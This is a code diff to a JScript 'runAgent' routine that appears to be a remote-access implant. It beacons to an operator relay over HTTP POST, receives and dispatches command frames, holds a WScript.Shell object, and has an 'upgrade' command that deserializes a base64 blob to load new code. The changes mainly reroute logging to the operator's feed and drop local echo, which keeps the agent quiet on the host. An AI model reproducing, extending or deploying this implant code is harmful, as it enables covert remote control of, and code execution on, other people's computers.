@@ -4,11 +4,6 @@ function runAgent() {
     function ensureShell() {
         if (!shell) shell = new ActiveXObject('WScript.Shell');
     }
-    // log() = local echo (gated) + relay ship (ALWAYS). Every line is POSTed with
-    // X-Agent-Log: 1: the relay answers immediately (no long-poll hold) and
-    // broadcasts an agent_log event to the operator's events feed. NEVER fatal —
-    // a failed ship must not kill the beacon loop — and the in-ship guard keeps a
-    // failing relay from recursing (ship failure is echoed locally, never re-shipped).
     // log() = relay ship ONLY (zero local echo — no Echo, no alert, no dbg).
     // Every line is POSTed with X-Agent-Log: 1: the relay answers immediately
     // (no long-poll hold) and broadcasts an agent_log event to the operator's
@@ -244,10 +239,10 @@ function runAgent() {
                     blobFormatter.Deserialize_2(base64ToStream(blobB64, base64Length(blobB64)));
                 }
                 log('upgrade: deserialize done');
-                postLog('upgrade ok');
                 return u32Bytes(0);
-            } catch (e) { var upErr = (e && e.message ? e.message : e); log('upgrade failed: ' + upErr); postLog('upgrade failed: ' + upErr); return u32Bytes(1); }
+            } catch (e) { log('upgrade failed: ' + (e && e.message ? e.message : e)); return u32Bytes(1); }
         }
+        log('command opcode ' + bytes[0] + ' unknown — replying status 2');
         return u32Bytes(2);
     }
     ensureShell();
@@ -266,11 +261,8 @@ function runAgent() {
             for (var i = 0; i < identityHeaders.length; i++) {
                 try { xhr.setRequestHeader(identityHeaders[i][0], identityHeaders[i][1]); } catch (e3) {}
             }
-            log('POST start (' + pendingReplies.length + ' queued replies)');
             xhr.send(pendingReplies.length ? buildBodyStream(pendingReplies) : '');
-            log('POST end, status ' + xhr.status);
         } catch (e) {
-            log('beacon failed: ' + (e && e.message ? e.message : e));
             return 'fail';
         }
         if (xhr.status != 200) {
@@ -280,8 +272,9 @@ function runAgent() {
         pendingReplies = [];
         // Empty answer = nothing queued — re-POST immediately. The stream conversion
         // of a zero-length body throws, so gate on Content-Length, never on ''-checks.
-        if (parseInt(xhr.getResponseHeader('Content-Length') || '0', 10) == 0) { continue; }
+        if (parseInt(xhr.getResponseHeader('Content-Length') || '0', 10) == 0) { log('idle — empty answer'); continue; }
         var frames = parseFrames(responseToBytes(xhr.responseBody));
+        log('received ' + frames.length + ' command frame(s)');
         for (var f = 0; f < frames.length && !exiting; f++) {
             var replyBytes = dispatchCommand(frames[f]);
             if (exiting) { log('exit'); return 'exit'; }
